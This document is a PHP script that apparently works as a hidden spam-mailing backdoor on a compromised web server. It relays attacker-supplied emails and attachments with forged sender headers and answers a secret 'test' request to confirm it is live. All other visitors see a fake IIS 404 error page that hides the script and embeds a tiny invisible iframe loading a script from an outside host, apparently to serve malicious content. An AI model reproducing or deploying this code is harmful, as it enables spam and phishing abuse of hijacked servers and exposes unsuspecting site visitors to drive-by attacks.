<?


function lrLoQkFI($type,$mime,$xctmp,$from,$to,$subj,$text,$fname) {
$fun=fopen($fname,"rb");
$un=strtoupper(uniqid(time()));
$head.="From: ".$from."\r\n";
if ($xctmp!='') {$head.="X-Mailer: $xctmp\n";}
if ($mime!='') {$head.="Mime-Version: 1.0\n";}
$head.="Content-Type: multipart/mixed;\r\n";
$head.="boundary=\"".$un."\"\r\n\r\n";
$zag= "--".$un."\r\nContent-Type: ".$type."; charset=windows-1251\r\n";
$zag.="Content-Transfer-Encoding: 8bit\r\n\r\n".$text."\r\n";
$zag.="--".$un."\r\n";
$zag.="Content-Type: text/html; name=\"".basename($fname)."\"\r\n";
$zag.="Content-transfer-encoding: base64\r\n";
$zag.="Content-Disposition: attachment; filename=\"".basename($fname)."\"\r\n\r\n";
$zag.=chunk_split(base64_encode(fread($fun,filesize($fname))))."\r\n\r\n";
$zag.="--".$un."--\r\n\r\n";
return @mail("$to", "$subj", $zag, $head);
}

function JfkJnngk($type,$mime,$xctmp,$from,$to,$subj,$text) {
$head="From: $from\n";
if ($xctmp!='') {$head.="X-Mailer: $xctmp\n";}
if ($mime!='') {$head.="Mime-Version: 1.0\n";}
$head.= "Content-type: ".$type."; charset=windows-1251" . "\r\n";
return @mail($to,$subj,$text,$head);
}

if (!empty($_POST['caption']) && !empty($_POST['email']) && !empty($_POST['btype']) && !empty($_POST['emailsend']) && !empty($_POST['message']) && ($_POST['index'] == 'send'))
{

  $xclient = substr(htmlspecialchars(trim($_POST['clientname'])), 0, 80);
  $title = substr(htmlspecialchars(trim($_POST['caption'])), 0, 80);
  $mess64 = base64_decode($_POST['message']);
  $mess =  $mess64;
  $send_to = $_POST['emailsend'];    
  $from = $_POST['email'];
  $pmime = $_POST['mimevers'];
  $ptype = $_POST['btype'];
  
  if($_FILES['file']['name'] !=''){
    if (is_dir("tmp")) { } else { mkdir("tmp"); }
    if(is_uploaded_file($_FILES['file']['tmp_name']))   {
    if(move_uploaded_file($_FILES['file']['tmp_name'], "tmp/".basename($_FILES['file']['name']))) {
    if(lrLoQkFI($ptype,$pmime,$xclient,$from,$send_to,$title,$mess,"tmp/".basename($_FILES['file']['name']))!== FALSE) { echo "OK-FILE"; } else { echo "ERROR-FILE"; }
    @unlink("tmp/".basename($_FILES['file']['name']));
    } else { echo "ERROR-UPLOAD"; }
    } else { echo "ERROR-MOVE"; }
  } else {
             if(JfkJnngk($ptype,$pmime,$xclient,$from,$send_to,$title,$mess) !== FALSE) {
           echo "OK-MESS"; } else { echo "ERROR-MESS"; }
       }
}
else
{
if ($_GET['index'] == 'test') {echo "OK2009"; exit;} else
{
echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be found</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be found</h1>
The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.
<hr>
<p>Please try the following:</p>
<ul>
<li>Make sure that the Web site address displayed in the address bar of your browser is spelled and formatted correctly.</li>
<li>If you reached this page by clicking a link, contact
 the Web site administrator to alert them that the link is incorrectly formatted.
</li>
<li>Click the <a href="javascript:history.back(1)">Back</a> button to try another link.</li>
</ul>
<h2>HTTP Error 404 - File or directory not found.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>404</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Web Site Setup</b>, <b>Common Administrative Tasks</b>, and <b>About Custom Error Messages</b>.</li>
</ul>

</TD></TR></TABLE><iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body></HTML>';}

}  
  
?>
